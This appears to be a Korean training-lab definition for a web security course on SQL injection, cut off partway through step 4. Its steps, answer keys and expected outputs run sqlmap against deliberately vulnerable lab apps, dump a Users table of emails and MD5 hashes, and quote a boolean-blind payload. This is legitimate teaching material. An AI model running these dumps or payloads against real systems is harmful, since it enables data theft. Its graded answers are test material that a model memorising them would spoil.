lab_id: standalone-web-vuln-week05
title: "SQL Injection — Error/Union/Blind vs SQLi 탐지·방어"
version: standalone-web-vuln
course: web-vuln
week: 5
description: |
  SQL Injection 유형별 점검 실습(WSTG-INPV-05). SQLi 는 웹앱이 사용자 입력을 DB 질의에 그대로
  이어붙일 때 입력 속 SQL 문법이 코드로 실행되는 결함이다(OWASP A03). 본 실습은 추출 방식이 다른
  네 유형 — Union-based(결과에 직접), Boolean blind(참/거짓 응답 차이로 추론), Time blind(지연으로
  추론), Error-based(에러 메시지에 노출) — 을 SQLi 자동화 도구 sqlmap 으로 el34 의 취약 웹에 던져
  본다. juice(DetectionOnly)에는 sqlmap 이 취약 파라미터를 자동 탐지하고 Users 테이블의 email·
  password(MD5 해시)를 실제로 덤프(--dump)해 진짜 데이터 탈취를 입증하며, dvwa 에는 같은 sqlmap 이
  WAF(ModSecurity 942 룰군→949110)에 403 으로 전부 차단됨을 확인한다. 그 탐지 흔적을 modsec_audit.log
  의 942 룰 분포로 보고, 차단(dvwa)과 탐지만(juice)의 WAF 정책 차이를 비교한다. 마지막에 모든 유형을
  한 번에 막는 근본 방어 parameterized query 를 정리한다. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서
  공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 탐지 로그 확인은
  `ssh ccc@{{TARGET_IP}}`(el34 호스트) 후 `docker exec -it el34-web bash`. 인가된 실습만.
difficulty: hard
duration_minutes: 170
prerequisites:
  - "W01–W04 통과 (HTTP 기초·점검도구·정찰·인증/세션)"
  - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}, 비밀번호 1) + docker exec 접근"
  - "lecture §2(네 가지 추출 유형) §3(URL 인코딩 + 942→949110→403 메커니즘) §4(parameterized query 방어) 숙지"
objectives:
  - "sqlmap 으로 Union/Boolean blind/Time blind SQLi 를 자동 탐지하고 juice 의 Users 테이블(email·password)을 실제로 덤프한다"
  - "유형별 SQLi 가 ModSec 942 룰군(942100/942160/942190 등)에 잡히는 분포를 modsec_audit.log 로 확인한다"
  - "같은 sqlmap 이 dvwa(WAF 403 차단)와 juice(탐지만·추출 성공)에서 다른 결과를 내는 WAF 정책 차이를 비교한다"
  - "SQLi 의 근본 방어가 parameterized query 임을, 입력검증·최소권한·에러숨김·WAF 가 왜 보조인지를 설명한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      SQLi 점검을 시작하기 전에, 대상 웹앱(dvwa)이 실제로 응답하는지 도달성을 확인한다.
      ## 📖 개념 한 줄
      WSTG 점검자는 본격 공격 전에 항상 대상이 살아 있는지부터 확인한다 — 도달이 안 되면 어떤
      SQLi 도 시작할 수 없다. SQLi 점검 대상은 dvwa(차단 모드)와 juice(탐지 전용) 두 곳이다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) dvwa 대상을 whatweb으로 핑거프린팅 — 응답코드·서버·타이틀 확인(SQLi 점검 대상 도달성)
      whatweb -a1 --colour=never http://dvwa.el34.lab/
      ```
      ## 🔧 도구/옵션 풀이
      - `ssh att@192.168.0.202 (비번 1)` : 외부 공격자 VM 으로 접속해 명령을 실행한다.
      - `whatweb -a1 --colour=never http://dvwa.el34.lab/` : 웹 핑거프린팅 도구로 응답 코드·서버·타이틀을 수집한다.
      - dvwa 는 루트 요청부터 `[403 Forbidden]` 으로 응답 = 앞단에 WAF(ModSecurity) 가 서 있는 차단형 자산이라는 신호다.
      - SQLi 점검 대상은 dvwa(차단 모드)와 juice(탐지 전용) 두 vhost — Host 헤더(도메인)로 vhost 가 갈린다.
      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** whatweb 결과에 `[403 Forbidden]` 응답 코드가 찍히면 대상에 도달한
      것이고(WAF 가 루트부터 차단), 이로써 SQLi 점검 대상임을 확인한다.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      # 1) dvwa 대상을 whatweb으로 핑거프린팅 — 응답코드·서버·타이틀 확인(SQLi 점검 대상 도달성)
      ssh att@192.168.0.202 "whatweb -a1 --colour=never http://dvwa.el34.lab/"
    answer_detail: "SQLi 점검의 첫 단계 = 대상 도달성·정체 확인. el34 의 SQLi 점검 대상은 dvwa(ModSec 차단 모드)와 juice(DetectionOnly) 두 vhost 다. whatweb 으로 dvwa.el34.lab 을 핑거프린팅하면 루트부터 [403 Forbidden] 이 떨어지는데, 이는 앞단 WAF(ModSecurity)가 스캐너 요청을 차단하는 차단형 자산이라는 신호다. 응답 코드가 출력되면 도달 성공으로 판정한다."
    expected_output: |
      http://dvwa.el34.lab/ [403 Forbidden] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[403 Forbidden]
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] whatweb (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표
      가장 직접적인 추출 기법인 Union-based SQLi 를 juice 에 sqlmap 으로 던져, 취약 파라미터를
      자동 탐지하고 Users 테이블의 email·password 를 결과로 직접 뽑아낸다(진짜 데이터 탈취).
      ## 📖 개념 한 줄
      `UNION SELECT` 는 원래 질의 결과 뒤에 공격자가 고른 다른 데이터를 세로로 이어 붙여 같은
      화면에 직접 빼내는 기법이다. 결과가 곧장 보이므로 가장 빠른 추출이며, sqlmap 이 이 추출을
      자동화한다(lecture §2.1).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) juice 검색 파라미터 q를 sqlmap으로 자동 SQLi — 취약 판정 + DBMS 식별
      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring
      # 2) Users 테이블에서 email·password를 실제로 덤프(--dump) — 진짜 데이터 탈취 입증
      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --dump -T Users -C email,password --disable-coloring
      # 3) 해석 — 'q is vulnerable' + SQLite + Users 실데이터(MD5 해시) = 직접 추출 성공
      # → q 파라미터 SQLi로 Users 테이블 실추출(admin 해시 0c36...). juice는 추출 성공
      ```
      ## 🔧 도구/옵션 풀이
      - `sqlmap -u "URL"` : URL 의 파라미터에 SQLi 페이로드를 자동 생성·주입하는 표준 SQLi 자동화 도구(인코딩도 자동).
      - `--batch` : 대화형 질문에 기본값으로 자동 응답. `--level/--risk` : 탐지 범위·공격 강도(2/2 로 확대).
      - `--dump -T Users -C email,password` : 탐지된 취약점으로 Users 테이블의 지정 컬럼을 실제로 추출한다.
      - juice 검색 q 는 blind(참/거짓·시간) 컨텍스트라 sqlmap 이 blind 기법으로 한 비트씩 추출하지만, 결과는
        UNION 처럼 Users 테이블 전체가 화면에 나온다 — 자동화가 있으면 blind 도 직접 추출과 같은 결과다.
      ## ✅ 합격 기준
      `Users` 출력 시 통과. **근거:** sqlmap 이 `parameter 'q' is vulnerable`·`back-end DBMS: SQLite` 를
      판정하고 `Table: Users` 의 email·password 를 덤프하면 진짜 데이터 탈취(직접 추출)에 성공한 것이다.
    hint: 'sqlmap --dump (Users 추출)'
    category: manipulation
    points: 12
    answer: |
      # 1) juice 검색 파라미터 q를 sqlmap으로 자동 SQLi — 취약 판정 + DBMS 식별
      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --disable-coloring'
      # 2) Users 테이블에서 email·password를 실제로 덤프(--dump) — 진짜 데이터 탈취 입증
      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --dump -T Users -C email,password --disable-coloring'
      # 3) 해석 — 'q is vulnerable' + SQLite + Users 실데이터(MD5 해시) = 직접 추출 성공
      # → q 파라미터 SQLi로 Users 테이블 실추출(admin 해시 0c36...). juice는 추출 성공
    answer_detail: "Union-based = 결과를 화면에 직접 뽑아내는 가장 빠른 추출 기법이며, sqlmap 이 이를 자동화한다. sqlmap 이 juice 검색 파라미터 q 를 취약(parameter 'q' is vulnerable)으로 판정하고 back-end DBMS: SQLite 를 식별한 뒤, --dump 로 Users 테이블의 email·password(MD5 해시)를 실제로 추출한다 — admin@juice-sh.op 의 해시 0c36e517e3fa95aabf1bbffc6744a4ef 등 진짜 데이터가 나온다. juice 의 q 는 blind 컨텍스트라 내부적으로 boolean/time 기법을 쓰지만 자동화 덕에 결과는 UNION 처럼 테이블 전체가 나온다. 채점은 stdout 에 'Users'(추출된 테이블)가 보이는지로 판정한다."
    expected_output: |
      GET parameter 'q' is vulnerable.
      back-end DBMS: SQLite
      Database: <current>  Table: Users  [3 entries]
      +------------------------+----------------------------------+
      | email                  | password                         |
      +------------------------+----------------------------------+
      | J12934@juice-sh.op     | 0192023a7bbd73250516f069df18b500 |
      | accountant@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 |
      | admin@juice-sh.op      | 0c36e517e3fa95aabf1bbffc6744a4ef |
      +------------------------+----------------------------------+
      → q 파라미터 SQLi로 Users 테이블 실추출(admin 해시 0c36...). juice는 추출 성공
    verify:
      type: output_contains
      expect: 'Users'
      field: stdout
      semantic:
        intent: "Union SQLi(sqlmap 추출)"
        success_criteria: ["실데이터 덤프"]
        acceptable_methods: ["**[OSS] sqlmap (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 목표
      결과가 화면에 안 보일 때 쓰는 간접 추론 기법인 Boolean blind 를, sqlmap 의 boolean 기법(-B)
      으로 juice 에 던져 참/거짓 응답 차이로 추론하는 원리를 확인한다.
      ## 📖 개념 한 줄
      `'1'='1'`(항상 참)과 `'1'='2'`(항상 거짓)에 대한 서버 응답 차이(길이·내용)를 신호로 삼아,
      "예/아니오" 질문을 반복해 데이터를 한 비트씩 좁혀간다 — 느리지만 결과가 안 보여도 추출
      가능하다. sqlmap 이 이 참/거짓 판별을 자동 수행한다(lecture §2.2).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) sqlmap을 boolean-based blind 기법(-B)으로 한정해 juice q 파라미터 점검
      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=B --disable-coloring
      # 2) 해석 — 참/거짓(AND boolean) 페이로드로 응답 차이를 만들어 1비트씩 추론
      # → boolean-based blind 확인. 참/거짓 응답 차이로 결과 노출 없어도 추출
      ```
      ## 🔧 도구/옵션 풀이
      - `--technique=B` : sqlmap 이 쓸 기법을 boolean-based blind 하나로 한정한다(B=Boolean).
      - sqlmap 이 만드는 참 페이로드 예: `q=apple%' AND 5188=5188 AND 'uClH%'='uClH` — 참이면 원래 응답,
        거짓이면 다른 응답이 되게 해 그 차이를 신호로 삼는다.
      - 대상이 juice(DetectionOnly)인 이유 — 차단되지 않아 참/거짓 응답 차이를 끝까지 관찰할 수 있다.
      ## ✅ 합격 기준
      `boolean-based blind` 출력 시 통과. **근거:** sqlmap 이 `Type: boolean-based blind` 로 취약을
      확인하면 참/거짓 응답 차이로 데이터를 추론할 수 있음이 증명된 것이다.
    hint: 'sqlmap --technique=B (boolean blind)'
    category: manipulation
    points: 12
    answer: |
      # 1) sqlmap을 boolean-based blind 기법(-B)으로 한정해 juice q 파라미터 점검
      ssh att@192.168.0.202 'sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=B --disable-coloring'
      # 2) 해석 — 참/거짓(AND boolean) 페이로드로 응답 차이를 만들어 1비트씩 추론
      # → boolean-based blind 확인. 참/거짓 응답 차이로 결과 노출 없어도 추출
    answer_detail: "Boolean blind = 결과가 화면에 안 보일 때, 참(1=1)/거짓(1=2) 조건에 대한 응답 차이(페이지 길이·내용)로 데이터를 1비트씩 추론하는 간접 기법이며 sqlmap 이 이를 자동화한다. --technique=B 로 기법을 boolean 으로 한정하면 sqlmap 이 Type: boolean-based blind 로 취약을 확인하고, q=apple%' AND 5188=5188 AND 'uClH%'='uClH 같은 참 페이로드로 응답 차이를 만들어 낸다. Union 보다 느리지만 결과가 직접 노출되지 않는 곳에서도 추출할 수 있다. 채점은 stdout 에 'boolean-based blind' 가 보이는지로 판정한다."
    expected_output: |
      GET parameter 'q' is vulnerable.
      Parameter: q (GET)
          Type: boolean-based blind
          Title: AND boolean-based blind - WHERE or HAVING clause
          Payload: q=apple%' AND 5188=5188 AND 'uClH%'='uClH
      back-end DBMS: SQLite
      → boolean-based blind 확인. 참/거짓 응답 차이로 결과 노출 없어도 추출
    verify:
      type: output_contains
      expect: 'boolean-based blind'
      field: stdout
      semantic:
        intent: "Boolean blind SQLi(sqlmap)"
        success_criteria: ["boolean 기법 확인"]
        acceptable_methods: ["**[OSS] sqlmap (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표
      참/거짓 응답 차이조차 없을 때의 최후 수단인 Time blind 를, sqlmap 의 시간 기법(-T)으로 juice
      에 던져 응답 지연이 곧 신호가 된다는 것을 확인한다.
      ## 📖 개념 한 줄
      시간 지연(heavy query/SLEEP)으로 DB 가 일부러 늦게 응답하게 해, "맞으면 늦게·틀리면 빨리"
      응답하도록 만든다. 화면에 아무 차이가 없어도 응답 시간만으로 참/거짓을 추론한다 — 가장 느린
      추출이며, sqlmap 이 지연을 측정해 자동 추론한다(lecture §2.3).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) sqlmap을 time-based blind 기법(-T)으로 한정해 juice q 파라미터 점검
      sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" --batch --level=2 --risk=2 --technique=T --disable-coloring
      # 2) 해석 — 응답 지연(heavy query)을 유발해 시간차로 참/거짓 추론
      # → time-based blind 확인. 응답 시간만으로 추론(가장 느린 최후 수단)
      ```
      ## 🔧 도구/옵션 풀이
      - `--technique=T` : sqlmap 이 쓸 기법을 time-based blind 하나로 한정한다(T=Time).
      - sqlmap 은 참 조건일 때만 지연되는 heavy query 를 주입하고 응답 시간을 측정해 참/거짓을 판별한다 —
        SQLite 는 SLEEP() 이 없어 무거운 연산으로 지연을 만든다(`SQLite > 2.0 AND time-based blind`).
      - 응답 차이도 에러도 없는 가장 어려운 환경의 최후 수단이라 가장 느리다.
